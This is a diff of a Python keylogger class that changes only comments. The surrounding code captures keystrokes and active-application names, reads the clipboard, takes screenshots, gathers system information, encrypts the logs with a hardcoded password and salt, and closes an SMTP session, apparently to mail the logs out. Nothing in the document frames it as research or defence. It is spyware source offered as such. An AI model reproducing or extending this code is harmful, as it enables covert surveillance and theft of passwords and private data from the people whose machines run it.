@@ -21,7 +21,7 @@ import base64
 
 class Keylogger:
     def __init__(self, interval=15, iterations=5, buffer_size=20):
-        # Initalise variables
+        # Initialise keylogger settings and file paths
         self.time_interval = interval
         self.iterations = iterations
         self.buffer_size = buffer_size
@@ -37,9 +37,8 @@ class Keylogger:
         self.last_active_app = None
         self.stopping_time = 0
 
-    # Handles key press events, logging any pressed keys, 10 keys at a time
+    # Handles key press events, logging any pressed keys and buffering them
     def on_press(self, key):
-        #global keys, count, apps, current_time
 
         # appends key pressed and current open application to respective lists
         self.keys.append(key)
@@ -56,13 +55,14 @@ class Keylogger:
             self.apps.clear()
         
     def on_release(self, key):
+        # Stop listener on ESC or after time interval, flush buffer
         if key == Key.esc or self.current_time > self.stopping_time:
             # If there are remaining keys in the buffer, write them before stopping
             if self.keys:
                 self.write_file()
             return False
 
-    # Converts each key press into a string and appends to the output file, with spaces being converted into a new line
+    # Writes buffered keys and app info to log file
     def write_file(self):
         # Logs each key press
         with open(self.log_path, "a") as file:
@@ -88,7 +88,7 @@ class Keylogger:
                 else:
                     file.write(k)
                     
-    # Initialises log file with column names
+    # Create output directory and log files if they don't exist
     def init_files(self):
         os.makedirs(self.output_dir, exist_ok=True) 
 
@@ -185,7 +185,7 @@ class Keylogger:
         # terminating the session
         s.quit()
 
-    # Gets whatever is currently in users clipboard and saves it to clipboard.txt
+    # Gets whatever is currently in users clipboard and log it to clipboard.txt
     def log_clipboard(self):
         pb = NSPasteboard.generalPasteboard()
         pbstring = pb.stringForType_(NSStringPboardType)
@@ -201,7 +201,7 @@ class Keylogger:
         screenshot.show()
         screenshot.save(screenshot_path)
 
-    # generates a key based off a chosen password and saves it to 'key.txt'
+    # generates a key based off a chosen password and salt
     def get_key(self):
         password = "password".encode()
         salt = b'\x89\x07\x06\xc6i\x99\xd2\x950\xb5Sje\xe4\xd9\xff'
@@ -231,6 +231,7 @@ class Keylogger:
                     file.write(encrypted_data)
 
     def run(self):
+        # Main loop: log keys, clipboard, screenshots, then encrypt files
         self.init_files()
         self.log_sys_info()
 
@@ -263,6 +264,4 @@ if __name__ == "__main__":
     keylogger = Keylogger()
     keylogger.run()
 
-# Potential improvements
-# 
     
